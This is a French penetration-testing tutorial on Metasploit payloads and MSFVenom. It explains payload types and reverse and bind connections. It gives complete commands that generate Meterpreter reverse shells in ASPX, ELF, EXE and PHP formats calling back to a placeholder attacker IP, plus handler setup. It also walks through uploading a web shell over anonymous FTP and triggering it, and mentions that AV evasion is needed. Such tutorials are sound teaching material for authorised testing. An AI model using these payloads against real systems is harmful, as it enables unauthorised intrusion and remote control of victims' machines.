# Payloads et MSFVenom

Un exploit sans payload, c'est un vehicule sans moteur. Le payload est le code qui s'execute sur la cible une fois la vulnerabilite exploitee. Metasploit propose des centaines de payloads pour tous les OS et toutes les architectures, et MSFVenom permet d'en generer des versions autonomes, prets a etre deployes en dehors du framework.

## Pourquoi

Chaque scenario d'exploitation demande un payload adapte. Un serveur web sous Linux n'acceptera pas le meme payload qu'un poste Windows derriere un pare-feu. Comprendre la mecanique des payloads (types, connexions, formats) et savoir en generer avec MSFVenom est indispensable pour tout pentester.

## Comment ca marche

### Trois familles de payloads

| Type | Fonctionnement | Exemple |
|---|---|---|
| **Single** | Payload autonome, tout-en-un. Execute une action sans dependance externe | `windows/shell_reverse_tcp` |
| **Stager** | Petit code initial qui etablit la connexion et prepare le terrain pour le stage | `windows/x64/meterpreter/reverse_tcp` |
| **Stage** | Code principal (Meterpreter, shell) charge en memoire par le stager | Meterpreter DLL injectee apres connexion |

{% hint style="info" %}
La convention de nommage revele le type. Un `/` entre le composant et le transport (ex: `windows/meterpreter/reverse_tcp`) indique un couple stager + stage. Un `_` a la place du `/` (ex: `windows/meterpreter_reverse_tcp`) indique un single. Les stagers sont plus legers et passent mieux a travers les restrictions reseau.
{% endhint %}

### Modes de connexion

| Mode | Direction | Usage type |
|---|---|---|
| **Reverse** | La cible se connecte vers l'attaquant | Bypass de firewall (la cible initie la connexion sortante) |
| **Bind** | L'attaquant se connecte a un port ouvert sur la cible | Quand la cible est directement joignable sans filtrage entrant |

{% hint style="warning" %}
En environnement reel, le mode reverse est quasi systematique. Les pare-feu bloquent les connexions entrantes, mais laissent souvent passer le trafic sortant. Verifier que LHOST pointe vers la bonne interface (VPN, tun0) et que le port LPORT n'est pas deja utilise.
{% endhint %}

### Choisir un payload dans Metasploit

```bash
# - Lister les payloads compatibles avec l'exploit selectionne
msf6 exploit(windows/smb/ms17_010_psexec) > show payloads

# - Selectionner un payload
msf6 exploit(windows/smb/ms17_010_psexec) > set payload windows/meterpreter/reverse_tcp

# - Voir les options du payload
msf6 exploit(windows/smb/ms17_010_psexec) > show options
```

Les parametres essentiels sont toujours les memes : `LHOST` (IP de l'attaquant), `LPORT` (port d'ecoute), et `EXITFUNC` (methode de sortie du payload).

## En pratique

### Generer un payload avec MSFVenom

MSFVenom est l'outil en ligne de commande qui combine la generation de payloads et leur encodage. Il produit des fichiers autonomes dans le format de votre choix.

{% tabs %}
{% tab title="Reverse shell ASPX" %}
```bash
# - Payload pour un serveur IIS
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f aspx -o reverse_shell.aspx
```
{% endtab %}
{% tab title="Reverse shell ELF" %}
```bash
# - Payload pour une cible Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f elf -o shell.elf
```
{% endtab %}
{% tab title="Reverse shell EXE" %}
```bash
# - Payload pour une cible Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f exe -o shell.exe
```
{% endtab %}
{% tab title="Reverse shell PHP" %}
```bash
# - Payload pour un serveur web PHP
msfvenom -p php/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f raw -o shell.php
```
{% endtab %}
{% endtabs %}

### Configurer le handler

Le handler est le listener cote attaquant qui attend la connexion du payload.

```bash
# - Lancer le handler correspondant au payload genere
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST <IP_ATTAQUANT>
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run

# - Le handler attend la connexion...
[*] Started reverse TCP handler on <IP_ATTAQUANT>:4444
```

### Workflow complet : FTP + web shell

Scenario classique : un serveur FTP avec acces anonyme dont le repertoire est expose via un serveur web.

```bash
# 1 - Generer le payload adapte au serveur web
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<IP_ATTAQUANT> LPORT=4444 \
  -f aspx -o reverse_shell.aspx

# 2 - Uploader via FTP
ftp <IP_CIBLE>
> put reverse_shell.aspx
> bye

# 3 - Lancer le handler
msf6 > use multi/handler
msf6 > set payload windows/meterpreter/reverse_tcp
msf6 > set LHOST <IP_ATTAQUANT>
msf6 > set LPORT 4444
msf6 > run

# 4 - Declencher le payload via le navigateur
# Acceder a http://<IP_CIBLE>/reverse_shell.aspx
```

### Formats disponibles

```bash
# - Lister tous les formats de sortie
msfvenom --list formats
```

| Format | Extension | Usage |
|---|---|---|
| `exe` | `.exe` | Executable Windows |
| `elf` | `.elf` | Executable Linux |
| `aspx` | `.aspx` | Web shell IIS |
| `jsp` | `.jsp` | Web shell Tomcat |
| `war` | `.war` | Archive Java (Tomcat) |
| `php` | `.php` | Web shell PHP |
| `raw` | - | Shellcode brut |
| `python` | `.py` | Script Python |
| `powershell` | `.ps1` | Script PowerShell |

## Pieges et galeres

- **LHOST mal configure** : c'est la cause d'echec numero un. Verifier avec `ip a` que l'adresse correspond a l'interface reseau correcte (tun0 pour le VPN, eth0 pour le reseau local)
- **Payload incompatible** : un payload x86 ne fonctionnera pas sur un processus x64 (et inversement). Verifier l'architecture de la cible avant de generer
- **Handler non demarre** : si le payload se declenche avant que le handler ne soit pret, la connexion est perdue. Toujours lancer le handler en premier
- **Format incorrect** : un payload `.aspx` sur un serveur Apache/PHP ne s'executera pas. Adapter le format au stack technologique de la cible

## Retour terrain

MSFVenom est l'outil de reference pour generer des payloads rapidement. En pentest, on l'utilise surtout pour produire des reverse shells dans des formats specifiques (ASPX pour IIS, WAR pour Tomcat, ELF pour Linux). La combinaison MSFVenom + multi/handler est un reflexe de base. Pour l'evasion AV, les payloads MSFVenom bruts sont tres detectes, il faudra souvent passer par des outils complementaires ou des techniques d'obfuscation avancees.

## Memo express

| Commande | Usage |
|---|---|
| `msfvenom -l payloads` | Lister tous les payloads |
| `msfvenom -p <payload> --list-options` | Options du payload |
| `msfvenom -p <payload> -f <format> -o <fichier>` | Generer un payload |
| `msfvenom --list formats` | Formats de sortie disponibles |
| `use multi/handler` | Configurer le listener |
| `show payloads` | Payloads compatibles avec l'exploit |
| `set payload <nom>` | Selectionner un payload |

***
